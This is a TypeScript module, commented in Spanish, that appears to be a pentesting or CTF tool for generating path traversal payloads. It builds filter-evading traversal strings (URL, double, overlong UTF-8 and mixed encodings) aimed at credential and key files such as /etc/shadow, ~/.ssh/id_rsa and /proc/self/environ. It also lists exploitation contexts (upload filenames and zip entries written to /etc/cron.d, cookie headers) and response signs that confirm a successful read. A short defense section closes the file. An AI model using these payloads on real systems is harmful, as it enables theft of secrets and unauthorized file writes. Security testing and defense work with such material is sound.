/* Path Traversal — generador de payloads por SO, profundidad, codificación y
   contexto. Incluye detección por respuesta y defenses. 100% local. */

export type PtOs = 'unix' | 'windows' | 'java'
export type PtDepth = '0' | '1' | '2' | '3' | 'auto'
export type PtEncoding = 'plain' | 'url' | 'double' | 'unicode' | 'mixed'

export interface PtPayload {
  payload: string
  note: string
  tag: string
}

const targets: Record<PtOs, string[]> = {
  unix: ['/etc/passwd', '/etc/shadow', '/etc/hosts', '~/.ssh/id_rsa', '~/.bash_history', '/proc/self/environ', '/var/log/auth.log', '/flag.txt'],
  windows: ['C:\\Windows\\win.ini', 'C:\\Windows\\System32\\drivers\\etc\\hosts', 'C:\\inetpub\\wwwroot\\web.config', 'C:\\Users\\Administrator\\Desktop\\flag.txt'],
  java: ['/etc/passwd', 'C:\\Windows\\win.ini', 'WEB-INF/web.xml', 'WEB-INF/classes/application.properties'],
}

const targetLabel = (p: string): string => {
  if (p.includes('passwd')) return 'usuarios del sistema'
  if (p.includes('shadow')) return 'hashes (solo root)'
  if (p.includes('id_rsa')) return 'clave SSH privada'
  if (p.includes('bash_history')) return 'historial de comandos'
  if (p.includes('environ')) return 'variables de entorno (secrets)'
  if (p.includes('auth.log')) return 'log de autenticación'
  if (p.includes('flag')) return 'flag del CTF'
  if (p.includes('win.ini')) return 'canario universal de Windows'
  if (p.includes('web.config')) return 'config con connection strings'
  if (p.includes('web.xml')) return 'servlets y parámetros de contexto'
  if (p.includes('application.properties')) return 'secrets de Spring Boot'
  if (p.includes('hosts')) return 'hosts internos mapeados'
  return 'fichero de referencia'
}

const buildFor = (os: PtOs, depth: PtDepth, enc: PtEncoding, target: string): PtPayload[] => {
  const sep = os === 'windows' ? '\\' : '/'
  const up = os === 'windows' ? '..\\' : '../'
  // los targets unix llegan con / inicial: al concatenar con ../ produciría doble barra
  const rel = target.replace(/^[/\\]+/, '')
  const plain = (n: number): string => up.repeat(n) + rel
  const withDot = (n: number): string => (os === 'windows' ? `....\\....\\`.repeat(n) + rel : `....//`.repeat(n) + rel)
  const encUrl = (s: string): string => s.replace(/\.\./g, '%2e%2e').replace(/\//g, '%2f').replace(/\\/g, '%5c')
  const encDouble = (s: string): string => encUrl(s).replace(/%2e/g, '%252e').replace(/%2f/g, '%252f').replace(/%5c/g, '%255c')
  const encUnicode = (s: string): string => s.replace(/\.\./g, '..%c0%af').replace(/\//g, '..%c0%af')
  const out: PtPayload[] = []
  const depths = depth === 'auto' ? [1, 2, 3, 4, 6, 8] : [Number(depth)]
  for (const n of depths) {
    const base = plain(n)
    switch (enc) {
      case 'plain':
        out.push({ payload: base, note: targetLabel(target), tag: `${n} niveles` })
        if (os !== 'java') out.push({ payload: withDot(n), note: 'doble punto y doble barra: los filtros que hacen strip() una sola vez lo vuelven a romper', tag: '....//' })
        // unix y windows targets ya son rutas absolutas (/etc/passwd, C:\...)
        out.push({ payload: target, note: 'ruta absoluta: funciona si el file-open no concatena con el base path', tag: 'absoluta' })
        break
      case 'url':
        out.push({ payload: encUrl(base), note: 'url-encoding simple: pasa filtros que comparan con "../" literal', tag: 'url' })
        break
      case 'double':
        out.push({ payload: encDouble(base), note: 'double encoding: para backends que decodifican DOS veces (app server + framework)', tag: 'double' })
        break
      case 'unicode':
        out.push({ payload: encUnicode(base), note: 'overlong UTF-8 (%c0%af = /): clásico de Tomcat/Nginx viejos', tag: 'overlong' })
        break
      case 'mixed':
        out.push({ payload: `..%2f..%2f${rel}`, note: 'mixto: .. literal + / encoded, rompe filtros por patrones completos', tag: 'mixto' })
        out.push({ payload: `.%2e/.%2e/${rel}`, note: 'punto encoded, separador literal: otra mezcla que evita firmas', tag: 'mixto' })
        break
    }
  }
  return out.slice(0, 24)
}

export const ptPayloads = (os: PtOs, depth: PtDepth, enc: PtEncoding, chosenTargets: string[] = []): PtPayload[] => {
  const list = chosenTargets.length ? chosenTargets : targetsOf(os).slice(0, 4).map((t) => t.path)
  const out: PtPayload[] = []
  for (const t of list) out.push(...buildFor(os, depth, enc, t))
  return out.slice(0, 40)
}

export const targetsOf = (os: PtOs): { path: string; why: string }[] =>
  targets[os].map((p) => ({ path: p, why: targetLabel(p) }))

/* ─── contextos de explotación ─── */

export interface PtContext {
  id: string
  name: string
  example: string
  note: string
}

export const PT_CONTEXTS: PtContext[] = [
  { id: 'param', name: 'Parámetro de fichero', example: '?file=report.pdf', note: 'El clásico: download.aspx?f=, ?template=, ?lang=. Si la extensión se valida, usa null byte (legacy) o combina conFile upload.' },
  { id: 'filename', name: 'Nombre de fichero (upload)', example: 'filename="../../etc/cron.d/pwn"', note: 'En uploads, el filename del multipart llega directo a disco: si no se sanitiza, escribes FUERA del directorio de destino.' },
  { id: 'zip', name: 'Dentro de ZIP (zip slip)', example: 'entry: ../../../etc/cron.d/pwn', note: 'El extractor que no valida rutas de entries escribe fuera: mismo vector que el filename, pero dentro de un comprimido.' },
  { id: 'static', name: 'Servidor estático / proxy', example: 'GET /static/../../etc/passwd', note: 'Nginx/Apache con alias mal configurado (alias /static sin / final): el backend normaliza distinto que el proxy.' },
  { id: 'cookie', name: 'Cookie / header de preferencia', example: 'Cookie: theme=../../../../etc/passwd', note: 'Los headers que seleccionan plantillas o idiomas acaban en file() más a menudo de lo que parece.' },
]

/* ─── detección y defensa ─── */

export const ptDetection = (): { sign: string; meaning: string }[] => [
  { sign: 'root:x:0:0:root:/root:/bin/bash', meaning: 'LFI confirmado con lectura de /etc/passwd: busca luego SSH keys, configs y logs.' },
  { sign: '[fonts] / [extensions]', meaning: 'win.ini leído: traversal confirmado en Windows.' },
  { sign: 'Respuesta idéntica con cualquier depth', meaning: 'El app normaliza o el path se resuelve SIEMPRE igual: prueba encoding o ruta absoluta.' },
  { sign: '500 / file not found solo con ../', meaning: 'Filtro activo: prueba ....//, %2e%2e%2f o encoded variants.' },
  { sign: 'El campo acepta la ruta pero no refleja contenido', meaning: 'LFI ciego: usa time-based (file gigante) u OOB (fetch a tu server) para confirmar.' },
]

export const ptDefenses = (): { check: string; why: string }[] => [
  { check: 'Whitelist de valores permitidos', why: 'Para templates, idiomas y descargas: el ID del fichero, no su ruta. path = TABLE[userId] en vez de concatenar input.' },
  { check: 'Path.canonical + startsWith(base) en el servidor', why: 'Resuelve symlinks y .. ANTES de comparar: Files.realpath + validación del prefijo es el patrón correcto en Java.' },
  { check: 'Nunca usar el filename del cliente en disco', why: 'En uploads: UUID generado por el servidor, extensión whitelist y directorio chroot/jail.' },
  { check: 'Usuario de servicio con permisos mínimos', why: 'Aunque el traversal funcione, un www-data sin acceso a /home/otro reduce el daño: defense in depth real.' },
]
